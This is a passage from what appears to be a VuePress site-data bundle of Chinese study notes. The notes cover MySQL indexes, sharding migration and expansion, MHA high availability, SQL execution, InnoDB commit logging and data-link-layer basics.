因为二级索引的叶子节点就存放的是主键，根据主键再回表查数据。\n\n\n# 非聚集索引的优点\n\n更新代价比聚集索引要小 。非聚集索引的更新代价就没有聚集索引那么大了，非聚集索引的叶子节点是不存放数据的\n\n\n# 非聚集索引的缺点\n\n 1. 跟聚集索引一样，非聚集索引也依赖于有序的数据\n 2. 可能会二次查询(回表) :这应该是非聚集索引最大的缺点了。 当查到索引对应的指针或主键后，可能还需要根据指针或主键再到数据文件或表中查询。",normalizedContent:"# 聚集索引\n\n聚集索引即索引结构和数据一起存放的索引。主键索引属于聚集索引。\n\n在 mysql 中，innodb 引擎的表的 .ibd文件就包含了该表的索引和数据，对于 innodb 引擎表来说，该表的索引(b+树)的每个非叶子节点存储索引，叶子节点存储索引和索引对应的数据。\n\n\n# 聚集索引的优点\n\n聚集索引的查询速度非常的快，因为整个 b+树本身就是一颗多叉平衡树，叶子节点也都是有序的，定位到索引的节点，就相当于定位到了数据。\n\n\n# 聚集索引的缺点\n\n 1. 依赖于有序的数据 ：因为 b+树是多路平衡树，如果索引的数据不是有序的，那么就需要在插入时排序，如果数据是整型还好，否则类似于字符串或 uuid 这种又长又难比较的数据，插入或查找的速度肯定比较慢。\n 2. 更新代价大 ： 如果对索引列的数据被修改时，那么对应的索引也将会被修改， 而且况聚集索引的叶子节点还存放着数据，修改代价肯定是较大的， 所以对于主键索引来说，主键一般都是不可被修改的。\n\n\n# 非聚集索引\n\n非聚集索引即索引结构和数据分开存放的索引。\n\n二级索引属于非聚集索引。\n\n> myisam 引擎的表的.myi 文件包含了表的索引， 该表的索引(b+树)的每个叶子非叶子节点存储索引， 叶子节点存储索引和索引对应数据的指针，指向.myd 文件的数据。\n> \n> 非聚集索引的叶子节点并不一定存放数据的指针， 因为二级索引的叶子节点就存放的是主键，根据主键再回表查数据。\n\n\n# 非聚集索引的优点\n\n更新代价比聚集索引要小 。非聚集索引的更新代价就没有聚集索引那么大了，非聚集索引的叶子节点是不存放数据的\n\n\n# 非聚集索引的缺点\n\n 1. 跟聚集索引一样，非聚集索引也依赖于有序的数据\n 2. 可能会二次查询(回表) :这应该是非聚集索引最大的缺点了。 当查到索引对应的指针或主键后，可能还需要根据指针或主键再到数据文件或表中查询。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"如何让系统不停机迁移到分库分表",frontmatter:{title:"如何让系统不停机迁移到分库分表",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/f0b5a6/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/12.%E5%A6%82%E4%BD%95%E8%AE%A9%E7%B3%BB%E7%BB%9F%E4%B8%8D%E5%81%9C%E6%9C%BA%E8%BF%81%E7%A7%BB%E5%88%B0%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8.html",relativePath:"10.数据库/12.如何让系统不停机迁移到分库分表.md",key:"v-60781ee2",path:"/pages/f0b5a6/",headersStr:null,content:"双写迁移方案\n\n简单来说，就是在线上系统里面，之前所有写库的地方，增删改操作，都除了对老库增删改，都加上对新库的增删改，这就是所谓双写，同时写俩库，老库和新库。\n\n然后系统部署之后，新库数据差太远，用之前说的导数工具，跑起来读老库数据写新库，写的时候要根据gmt_modified这类字段判断这条数据最后修改的时间，除非是读出来的数据在新库里没有，或者是比新库的数据新才会写。\n\n接着导万一轮之后，有可能数据还是存在不一致，那么就程序自动做一轮校验，比对新老库每个表的每条数据，接着如果有不一样的，就针对那些不一样的，从老库读数据再次写。反复循环，直到两个库每个表的数据都完全一致为止。\n\n接着当数据完全一致了，就ok了，基于仅仅使用分库分表的最新代码，重新部署一次，不就仅仅基于分库分表在操作了么，还没有几个小时的停机时间，很稳。所以现在基本玩儿数据迁移之类的，都是这么干了。\n\n",normalizedContent:"双写迁移方案\n\n简单来说，就是在线上系统里面，之前所有写库的地方，增删改操作，都除了对老库增删改，都加上对新库的增删改，这就是所谓双写，同时写俩库，老库和新库。\n\n然后系统部署之后，新库数据差太远，用之前说的导数工具，跑起来读老库数据写新库，写的时候要根据gmt_modified这类字段判断这条数据最后修改的时间，除非是读出来的数据在新库里没有，或者是比新库的数据新才会写。\n\n接着导万一轮之后，有可能数据还是存在不一致，那么就程序自动做一轮校验，比对新老库每个表的每条数据，接着如果有不一样的，就针对那些不一样的，从老库读数据再次写。反复循环，直到两个库每个表的数据都完全一致为止。\n\n接着当数据完全一致了，就ok了，基于仅仅使用分库分表的最新代码，重新部署一次，不就仅仅基于分库分表在操作了么，还没有几个小时的停机时间，很稳。所以现在基本玩儿数据迁移之类的，都是这么干了。\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"如何设计可以动态扩容的分库分表方案？",frontmatter:{title:"如何设计可以动态扩容的分库分表方案？",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/f04f9f/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/13.%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E5%8F%AF%E4%BB%A5%E5%8A%A8%E6%80%81%E6%89%A9%E5%AE%B9%E7%9A%84%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E6%96%B9%E6%A1%88%EF%BC%9F.html",relativePath:"10.数据库/13.如何设计可以动态扩容的分库分表方案？.md",key:"v-2e952870",path:"/pages/f04f9f/",headersStr:null,content:"# 思考步骤\n\n * 选择一个数据库中间件，调研、学习、测试\n * 设计你的分库分表的一个方案，你要分成多少个库，每个库分成多少个表，3个库每个库4个表\n * 基于选择好的数据库中间件，以及在测试环境建立好的分库分表的环境，然后测试一下能否正常进行分库分表的读写\n * 完成单库单表到分库分表的迁移，双写方案\n * 线上系统开始基于分库分表对外提供服务\n * 扩容了，扩容成6个库，每个库需要12个表，你怎么来增加更多库和表呢？\n\n这个是你必须面对的一个事儿，就是你已经弄好分库分表方案了，然后一堆库和表都建好了，基于分库分表中间件的代码开发啥的都好了，测试都ok了，数据能均匀分布到各个库和各个表里去，而且接着你还通过双写的方案咔嚓一下上了系统，已经直接基于分库分表方案在搞了。\n\n那么现在问题来了，你现在这些库和表又支撑不住了，要继续扩容咋办？这个可能就是说你的每个库的容量又快满了，或者是你的表数据量又太大了，也可能是你每个库的写并发太高了，你得继续扩容。\n\n\n# 停机扩容\n\n这个方案就跟停机迁移一样，步骤几乎一致，唯一的一点就是那个导数的工具，是把现有库表的数据抽出来慢慢倒入到新的库和表里去。但是最好别这么玩儿，有点不太靠谱，因为既然分库分表就说明数据量实在是太大了，可能多达几亿条，甚至几十亿，你这么玩儿，可能会出问题。\n\n从单库单表迁移到分库分表的时候，数据量并不是很大，单表最大也就两三千万\n\n写个工具，多弄几台机器并行跑，1小时数据就导完了\n\n3个库+12个表，跑了一段时间了，数据量都1亿~2亿了。光是导2亿数据，都要导个几个小时，6点，刚刚导完数据，还要搞后续的修改配置，重启系统，测试验证，10点才可以搞完\n\n\n# 优化后的方案\n\n一开始上来就是32个库，每个库32个表，1024张表\n\n我可以告诉各位同学说，这个分法，第一，基本上国内的互联网肯定都是够用了，第二，无论是并发支撑还是数据量支撑都没问题\n\n每个库正常承载的写入并发量是1000，那么32个库就可以承载32 * 1000 = 32000的写并发，如果每个库承载1500的写并发，32 * 1500 = 48000的写并发，接近5万/s的写入并发，前面再加一个MQ，削峰，每秒写入MQ 8万条数据，每秒消费5万条数据。\n\n有些除非是国内排名非常靠前的这些公司，他们的最核心的系统的数据库，可能会出现几百台数据库的这么一个规模，128个库，256个库，512个库，1024张表，假设每个表放500万数据，在MySQL里可以放50亿条数据\n\n每秒的5万写并发，总共50亿条数据，对于国内大部分的互联网公司来说，其实一般来说都够了\n\n谈分库分表的扩容，第一次分库分表，就一次性给他分个够，32个库，1024张表，可能对大部分的中小型互联网公司来说，已经可以支撑好几年了\n\n一个实践是利用32 * 32来分库分表，即分为32个库，每个库里一个表分为32张表。一共就是1024张表。根据某个id先根据32取模路由到库，再根据32取模路由到库里的表。\n\n刚开始的时候，这个库可能就是逻辑库，建在一个数据库上的，就是一个mysql服务器可能建了n个库，比如16个库。后面如果要拆分，就是不断在库和mysql服务器之间做迁移就可以了。然后系统配合改一下配置即可。\n\n比如说最多可以扩展到32个数据库服务器，每个数据库服务器是一个库。如果还是不够？最多可以扩展到1024个数据库服务器，每个数据库服务器上面一个库一个表。因为最多是1024个表么。\n\n这么搞，是不用自己写代码做数据迁移的，都交给dba来搞好了，但是dba确实是需要做一些库表迁移的工作，但是总比你自己写代码，抽数据导数据来的效率高得多了。\n\n\n\n哪怕是要减少库的数量，也很简单，其实说白了就是按倍数缩容就可以了，然后修改一下路由规则。\n\n\n# 总结\n\n * 设定好几台数据库服务器，每台服务器上几个库，每个库多少个表，推荐是32库 * 32表，对于大部分公司来说，可能几年都够了\n * 路由的规则，orderId 模 32 = 库，orderId / 32 模 32 = 表\n * 扩容的时候，申请增加更多的数据库服务器，装好mysql，倍数扩容，4台服务器，扩到8台服务器，16台服务\n * 由dba负责将原先数据库服务器的库，迁移到新的数据库服务器上去，很多工具，库迁移，比较便捷\n * 我们这边就是修改一下配置，调整迁移的库所在数据库服务器的地址\n * 重新发布系统，上线，原先的路由规则变都不用变，直接可以基于2倍的数据库服务器的资源，继续进行线上系统的提供服务",normalizedContent:"# 思考步骤\n\n * 选择一个数据库中间件，调研、学习、测试\n * 设计你的分库分表的一个方案，你要分成多少个库，每个库分成多少个表，3个库每个库4个表\n * 基于选择好的数据库中间件，以及在测试环境建立好的分库分表的环境，然后测试一下能否正常进行分库分表的读写\n * 完成单库单表到分库分表的迁移，双写方案\n * 线上系统开始基于分库分表对外提供服务\n * 扩容了，扩容成6个库，每个库需要12个表，你怎么来增加更多库和表呢？\n\n这个是你必须面对的一个事儿，就是你已经弄好分库分表方案了，然后一堆库和表都建好了，基于分库分表中间件的代码开发啥的都好了，测试都ok了，数据能均匀分布到各个库和各个表里去，而且接着你还通过双写的方案咔嚓一下上了系统，已经直接基于分库分表方案在搞了。\n\n那么现在问题来了，你现在这些库和表又支撑不住了，要继续扩容咋办？这个可能就是说你的每个库的容量又快满了，或者是你的表数据量又太大了，也可能是你每个库的写并发太高了，你得继续扩容。\n\n\n# 停机扩容\n\n这个方案就跟停机迁移一样，步骤几乎一致，唯一的一点就是那个导数的工具，是把现有库表的数据抽出来慢慢倒入到新的库和表里去。但是最好别这么玩儿，有点不太靠谱，因为既然分库分表就说明数据量实在是太大了，可能多达几亿条，甚至几十亿，你这么玩儿，可能会出问题。\n\n从单库单表迁移到分库分表的时候，数据量并不是很大，单表最大也就两三千万\n\n写个工具，多弄几台机器并行跑，1小时数据就导完了\n\n3个库+12个表，跑了一段时间了，数据量都1亿~2亿了。光是导2亿数据，都要导个几个小时，6点，刚刚导完数据，还要搞后续的修改配置，重启系统，测试验证，10点才可以搞完\n\n\n# 优化后的方案\n\n一开始上来就是32个库，每个库32个表，1024张表\n\n我可以告诉各位同学说，这个分法，第一，基本上国内的互联网肯定都是够用了，第二，无论是并发支撑还是数据量支撑都没问题\n\n每个库正常承载的写入并发量是1000，那么32个库就可以承载32 * 1000 = 32000的写并发，如果每个库承载1500的写并发，32 * 1500 = 48000的写并发，接近5万/s的写入并发，前面再加一个mq，削峰，每秒写入mq 8万条数据，每秒消费5万条数据。\n\n有些除非是国内排名非常靠前的这些公司，他们的最核心的系统的数据库，可能会出现几百台数据库的这么一个规模，128个库，256个库，512个库，1024张表，假设每个表放500万数据，在mysql里可以放50亿条数据\n\n每秒的5万写并发，总共50亿条数据，对于国内大部分的互联网公司来说，其实一般来说都够了\n\n谈分库分表的扩容，第一次分库分表，就一次性给他分个够，32个库，1024张表，可能对大部分的中小型互联网公司来说，已经可以支撑好几年了\n\n一个实践是利用32 * 32来分库分表，即分为32个库，每个库里一个表分为32张表。一共就是1024张表。根据某个id先根据32取模路由到库，再根据32取模路由到库里的表。\n\n刚开始的时候，这个库可能就是逻辑库，建在一个数据库上的，就是一个mysql服务器可能建了n个库，比如16个库。后面如果要拆分，就是不断在库和mysql服务器之间做迁移就可以了。然后系统配合改一下配置即可。\n\n比如说最多可以扩展到32个数据库服务器，每个数据库服务器是一个库。如果还是不够？最多可以扩展到1024个数据库服务器，每个数据库服务器上面一个库一个表。因为最多是1024个表么。\n\n这么搞，是不用自己写代码做数据迁移的，都交给dba来搞好了，但是dba确实是需要做一些库表迁移的工作，但是总比你自己写代码，抽数据导数据来的效率高得多了。\n\n\n\n哪怕是要减少库的数量，也很简单，其实说白了就是按倍数缩容就可以了，然后修改一下路由规则。\n\n\n# 总结\n\n * 设定好几台数据库服务器，每台服务器上几个库，每个库多少个表，推荐是32库 * 32表，对于大部分公司来说，可能几年都够了\n * 路由的规则，orderid 模 32 = 库，orderid / 32 模 32 = 表\n * 扩容的时候，申请增加更多的数据库服务器，装好mysql，倍数扩容，4台服务器，扩到8台服务器，16台服务\n * 由dba负责将原先数据库服务器的库，迁移到新的数据库服务器上去，很多工具，库迁移，比较便捷\n * 我们这边就是修改一下配置，调整迁移的库所在数据库服务器的地址\n * 重新发布系统，上线，原先的路由规则变都不用变，直接可以基于2倍的数据库服务器的资源，继续进行线上系统的提供服务",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"索引类型",frontmatter:{title:"索引类型",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/0151c1/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/14.%E7%B4%A2%E5%BC%95%E7%B1%BB%E5%9E%8B.html",relativePath:"10.数据库/14.索引类型.md",key:"v-3a57ab60",path:"/pages/0151c1/",headersStr:null,content:"# 主键索引(Primary Key)\n\n数据表的主键列使用的就是主键索引。\n\n一张数据表有只能有一个主键，并且主键不能为 null，不能重复。\n\n在 MySQL 的 InnoDB 的表中，当没有显示的指定表的主键时，InnoDB 会自动先检查表中是否有唯一索引且不允许存在null值的字段，如果有，则选择该字段为默认的主键，否则 InnoDB 将会自动创建一个 6Byte 的自增主键。\n\n\n# 二级索引(辅助索引)\n\n二级索引又称为辅助索引，是因为二级索引的叶子节点存储的数据是主键。也就是说，通过二级索引，可以定位主键的位置。\n\n唯一索引，普通索引，前缀索引等索引属于二级索引。\n\nPS:不懂的同学可以暂存疑，慢慢往下看，后面会有答案的，也可以自行搜索。\n\n 1. 唯一索引(Unique Key) ：唯一索引也是一种约束。唯一索引的属性列不能出现重复的数据，但是允许数据为 NULL，一张表允许创建多个唯一索引。 建立唯一索引的目的大部分时候都是为了该属性列的数据的唯一性，而不是为了查询效率。\n 2. 普通索引(Index) ：普通索引的唯一作用就是为了快速查询数据，一张表允许创建多个普通索引，并允许数据重复和 NULL。\n 3. 前缀索引(Prefix) ：前缀索引只适用于字符串类型的数据。前缀索引是对文本的前几个字符创建索引，相比普通索引建立的数据更小， 因为只取前几个字符。\n 4. 全文索引(Full Text) ：全文索引主要是为了检索大文本数据中的关键字的信息，是目前搜索引擎数据库使用的一种技术。Mysql5.6 之前只有 MYISAM 引擎支持全文索引，5.6 之后 InnoDB 也支持了全文索引。",normalizedContent:"# 主键索引(primary key)\n\n数据表的主键列使用的就是主键索引。\n\n一张数据表有只能有一个主键，并且主键不能为 null，不能重复。\n\n在 mysql 的 innodb 的表中，当没有显示的指定表的主键时，innodb 会自动先检查表中是否有唯一索引且不允许存在null值的字段，如果有，则选择该字段为默认的主键，否则 innodb 将会自动创建一个 6byte 的自增主键。\n\n\n# 二级索引(辅助索引)\n\n二级索引又称为辅助索引，是因为二级索引的叶子节点存储的数据是主键。也就是说，通过二级索引，可以定位主键的位置。\n\n唯一索引，普通索引，前缀索引等索引属于二级索引。\n\nps:不懂的同学可以暂存疑，慢慢往下看，后面会有答案的，也可以自行搜索。\n\n 1. 唯一索引(unique key) ：唯一索引也是一种约束。唯一索引的属性列不能出现重复的数据，但是允许数据为 null，一张表允许创建多个唯一索引。 建立唯一索引的目的大部分时候都是为了该属性列的数据的唯一性，而不是为了查询效率。\n 2. 普通索引(index) ：普通索引的唯一作用就是为了快速查询数据，一张表允许创建多个普通索引，并允许数据重复和 null。\n 3. 前缀索引(prefix) ：前缀索引只适用于字符串类型的数据。前缀索引是对文本的前几个字符创建索引，相比普通索引建立的数据更小， 因为只取前几个字符。\n 4. 全文索引(full text) ：全文索引主要是为了检索大文本数据中的关键字的信息，是目前搜索引擎数据库使用的一种技术。mysql5.6 之前只有 myisam 引擎支持全文索引，5.6 之后 innodb 也支持了全文索引。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"MHA mysql高可用",frontmatter:{title:"MHA mysql高可用",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/342312/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/15.MHA%20mysql%E9%AB%98%E5%8F%AF%E7%94%A8.html",relativePath:"10.数据库/15.MHA mysql高可用.md",key:"v-82c94d50",path:"/pages/342312/",headersStr:null,content:"mysql默认的主从架构不能解决高可用的问题，他在主节点发生错误的时候，不能够自动切换，需要运维人员来处理\n\nMHA是最成熟MySQL高可用方案,采用Perl语言开发\n\n\n\n * vip 虚拟ip\n\n * MHA manager 主要是用于管理节点\n\n * MHA node 接收MHA manager的命令，自动化执行一些任务 故障转移备份迁移等\n\n * binlog server 同步主服务的binlog\n\n\n\nMHA manager会默认每3秒向master发送select 1，来检测是否连接成功 如果三次不成功，则会找slave节点去用ssh访问 ，如果所有的从节点都访问不上就会认为 master已经挂掉了\n\n切断slave节点和master节点的同步，然后断开VIP和master的绑定 然后manager读取binlog server的数据 manager找出最新的relay log的MHA node，然后让这个MHA同步数据给所有的slave 然后manager再将这些slave缺失的数据发给slave 然后manager挑选出一个新的master old master恢复后，可以作为slave自动从new master同步\n\n优点:\n\n * 由per语言开发的开源工具可以支持基于GTID的复制模式\n * 当主DB不可用时，从多个从服务器中选举出来新的主DB = 提供了主从切换和故障转移功能，在线故障转移时不易丢失数据同一个监控节点可以监控多个集群 缺点:\n * 需要编写脚本或利用第三方工具来实现VIP的配置\n * MHA启动后只只监控主服务器是否可用，没办法监控从服务器需要\n * 基于SSH免认证登陆配置，存在一定的安全隐患\n * 没有提供从服务器的读负载均衡功能",normalizedContent:"mysql默认的主从架构不能解决高可用的问题，他在主节点发生错误的时候，不能够自动切换，需要运维人员来处理\n\nmha是最成熟mysql高可用方案,采用perl语言开发\n\n\n\n * vip 虚拟ip\n\n * mha manager 主要是用于管理节点\n\n * mha node 接收mha manager的命令，自动化执行一些任务 故障转移备份迁移等\n\n * binlog server 同步主服务的binlog\n\n\n\nmha manager会默认每3秒向master发送select 1，来检测是否连接成功 如果三次不成功，则会找slave节点去用ssh访问 ，如果所有的从节点都访问不上就会认为 master已经挂掉了\n\n切断slave节点和master节点的同步，然后断开vip和master的绑定 然后manager读取binlog server的数据 manager找出最新的relay log的mha node，然后让这个mha同步数据给所有的slave 然后manager再将这些slave缺失的数据发给slave 然后manager挑选出一个新的master old master恢复后，可以作为slave自动从new master同步\n\n优点:\n\n * 由per语言开发的开源工具可以支持基于gtid的复制模式\n * 当主db不可用时，从多个从服务器中选举出来新的主db = 提供了主从切换和故障转移功能，在线故障转移时不易丢失数据同一个监控节点可以监控多个集群 缺点:\n * 需要编写脚本或利用第三方工具来实现vip的配置\n * mha启动后只只监控主服务器是否可用，没办法监控从服务器需要\n * 基于ssh免认证登陆配置，存在一定的安全隐患\n * 没有提供从服务器的读负载均衡功能",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"MVCC",frontmatter:{title:"MVCC",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/fe79fe/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/16.MVCC.html",relativePath:"10.数据库/16.MVCC.md",key:"v-369d666a",path:"/pages/fe79fe/",headersStr:null,content:"https://www.bilibili.com/video/BV1hL411479T",normalizedContent:"https://www.bilibili.com/video/bv1hl411479t",charsets:{},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"SQL执行流程",frontmatter:{title:"SQL执行流程",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/1fd704/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/17.SQL%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.html",relativePath:"10.数据库/17.SQL执行流程.md",key:"v-625d7813",path:"/pages/1fd704/",headersStr:null,content:" 1. 数据库驱动和和数据库之间使用连接池建立连接，传输SQL\n 2. 接受到SQL之后，转交SQL语句给SQL接口来处理\n 3. SQL接口调用SQL解析器，对SQL进行语义解析\n 4. 解析完成后，转交给查询优化器，选择一条较优的执行操作流程\n 5. 调用SQL执行器处理SQL，SQL执行器调用存储引擎来处理数据\n\n> MySQL的架构设计中，SQL接口、SQL解析器、 查询优化器其实都是通用的，他就是一套组件而已。 但是存储引擎的话，他是支持各种各样的存储引擎的，比如我们常见的InnoDB、MylSAM、 Memory等等,我们是可以选择使用哪种存储引擎赖责具体的SQL语句执行的。当然现在MySQL一般都是使用InnoDB存储引擎的",normalizedContent:" 1. 数据库驱动和和数据库之间使用连接池建立连接，传输sql\n 2. 接受到sql之后，转交sql语句给sql接口来处理\n 3. sql接口调用sql解析器，对sql进行语义解析\n 4. 解析完成后，转交给查询优化器，选择一条较优的执行操作流程\n 5. 调用sql执行器处理sql，sql执行器调用存储引擎来处理数据\n\n> mysql的架构设计中，sql接口、sql解析器、 查询优化器其实都是通用的，他就是一套组件而已。 但是存储引擎的话，他是支持各种各样的存储引擎的，比如我们常见的innodb、mylsam、 memory等等,我们是可以选择使用哪种存储引擎赖责具体的sql语句执行的。当然现在mysql一般都是使用innodb存储引擎的",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"Mysql索引在什么情况下会失效？",frontmatter:{title:"Mysql索引在什么情况下会失效？",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/9a8ade/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/18.Mysql%E7%B4%A2%E5%BC%95%E5%9C%A8%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E4%BC%9A%E5%A4%B1%E6%95%88%EF%BC%9F.html",relativePath:"10.数据库/18.Mysql索引在什么情况下会失效？.md",key:"v-159f2e8a",path:"/pages/9a8ade/",headersStr:null,content:"失效的场景\n\n * like 查询时’%'在前面\n * 组合索引时，把后面的字段写在前面\n * or 查询时，只有or前后的两个列都是索引时，才会使用索引，否则不使用\n * not in和not exist",normalizedContent:"失效的场景\n\n * like 查询时’%'在前面\n * 组合索引时，把后面的字段写在前面\n * or 查询时，只有or前后的两个列都是索引时，才会使用索引，否则不使用\n * not in和not exist",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"mysql innoDB存储引擎 事务的提交过程",frontmatter:{title:"mysql innoDB存储引擎 事务的提交过程",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/dd5693/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/19.mysql%20innoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%20%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%8F%90%E4%BA%A4%E8%BF%87%E7%A8%8B.html",relativePath:"10.数据库/19.mysql innoDB存储引擎 事务的提交过程.md",key:"v-005dfec7",path:"/pages/dd5693/",headersStr:null,content:"# 三种日志\n\n 1. undo日志： 主要用于记录之前的值 ，如果事务没提交用于回退\n 2. redo日志：记录物理性修改记录 对某个数据页的 某个数据项进行修改\n 3. binlog日志 ：记录逻辑性的修改记录 如user表id=10的记录的修改\n\n\n# 过程\n\n 1. 判断数据是否在缓冲池中 若不在则从硬盘中读取 并加锁\n 2. 写undo日志\n 3. 修改缓冲池数据\n 4. 写redo日志（内存）\n 5. 将redo日志写入磁盘\n 6. 将binlog日志写入磁盘\n 7. 将此次binlog日志所在文件以及对应的记录 记录到redo日志文件中（提交commit）",normalizedContent:"# 三种日志\n\n 1. undo日志： 主要用于记录之前的值 ，如果事务没提交用于回退\n 2. redo日志：记录物理性修改记录 对某个数据页的 某个数据项进行修改\n 3. binlog日志 ：记录逻辑性的修改记录 如user表id=10的记录的修改\n\n\n# 过程\n\n 1. 判断数据是否在缓冲池中 若不在则从硬盘中读取 并加锁\n 2. 写undo日志\n 3. 修改缓冲池数据\n 4. 写redo日志（内存）\n 5. 将redo日志写入磁盘\n 6. 将binlog日志写入磁盘\n 7. 将此次binlog日志所在文件以及对应的记录 记录到redo日志文件中（提交commit）",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/f64997/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/00.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"06.网络/02.网络原理/02.数据链路层/00.基本概念.md",key:"v-b1fbcaae",path:"/pages/f64997/",headers:[{level:2,title:"1.封装成帧",slug:"_1-封装成帧",normalizedTitle:"1.封装成帧",charIndex:715},{level:2,title:"2. 透明传输",slug:"_2-透明传输",normalizedTitle:"2. 透明传输",charIndex:777},{level:2,title:"3. 差错控制",slug:"_3-差错控制",normalizedTitle:"3. 差错控制",charIndex:842},{level:2,title:"4. 流量控制",slug:"_4-流量控制",normalizedTitle:"4. 流量控制",charIndex:912},{level:2,title:"5. 链路管理",slug:"_5-链路管理",normalizedTitle:"5. 链路管理",charIndex:977},{level:2,title:"6. MAC寻址",slug:"_6-mac寻址",normalizedTitle:"6. mac寻址",charIndex:1040}],headersStr:"1.封装成帧 2. 透明传输 3. 差错控制 4. 流量控制 5. 链路管理 6. MAC寻址",content:"# 设置数据链路层的原因\n\n * 传输介质种类多，通信规程不相同， 性能有差异；\n * 物理层中，数据是以比特为单位进行传输， 效率低；\n * 在原始的物理线路上， 信号传输可能会有差错， 且物理层不知道是否出错；\n * 从网络参考模型的角度看，物理层之上的各层都有改善数据传输质量的责任， 而数据链路层是最重要的一层。\n\n\n# 设置数据链路层的目的\n\n在原始的、有差错的物理传输线路的基础上，采取差错检测、差错控制与流量控制等方法，将有差错的物理线路改进成逻辑上无差错的数据链路，向网络层提供高质量的服务。\n\n\n# 信道的两种类型\n\n * 点对点信道： 这种信道使用一对一的点对点通信方式。\n\n * 广播信道： 这种信道使用一对多的广播通信方式。广播信道上连接的主机很多，须使用专用的共享信道协议来协调这些主机的数据发送。\n\n\n# 链路(link)和数据链路(data link)\n\n链路(link)是从一个结点到相邻结点的一段物理线路，中间没有任何其他的交换结点。\n\n * 数据通信时，两个计算机之间的通信路径往往需要经过多个这种链路，也称为物理链路；\n * 一条链路只是一条通路（路径）的组成部分；\n * 物理线路：点对点（ 结点到相邻结点）\n * 物理线路：有线的、无线的、局域网\n\n数据链路(data link) 把实现通信协议的硬件和软件加到链路上，就构成了数据链路，也称为逻辑链路。\n\n * 适配器（即网卡）来实现这些协议的硬件和软件；\n * 适配器：一般包括了数据链路层和物理层的功能；\n * 逻辑链路是建立在物理链路之上；\n * 如果物理线路都不通，不可能建立用于数据传输的逻辑链路。\n\n\n# 基本功能\n\n\n# 1.封装成帧\n\n封装成帧\n\n * 数据链路层传输单位是“帧”。\n * 把数据报组装成“帧”，正确发送、接收、解封。\n\n\n# 2. 透明传输\n\n透明传输\n\n * 无论哪种比特组合， 都可以在数据链路上进行有效传输\n * 要区分数据信息、控制信息。\n\n\n# 3. 差错控制\n\n差错检测\n\n * 数据通信中难免出现传送错误，要降低出错率，提高可靠性。\n * 要尽可能地检测错误，并纠正错误。\n\n\n# 4. 流量控制\n\n * 控制数据通信的流量，确保数据通信的有序进行；\n * 避免因为接收方来不及接收， 而造成数据丢失。\n\n\n# 5. 链路管理\n\n * 通信时，双方先要建立一条数据链路； 传输数据时要维持数据链路； 通 信完毕时要释放数据链路。\n\n\n# 6. MAC寻址\n\n * MAC子层主要功能。\n * 指的是网卡的MAC地址， 即“物理地址”、“硬件地址” 。",normalizedContent:"# 设置数据链路层的原因\n\n * 传输介质种类多，通信规程不相同， 性能有差异；\n * 物理层中，数据是以比特为单位进行传输， 效率低；\n * 在原始的物理线路上， 信号传输可能会有差错， 且物理层不知道是否出错；\n * 从网络参考模型的角度看，物理层之上的各层都有改善数据传输质量的责任， 而数据链路层是最重要的一层。\n\n\n# 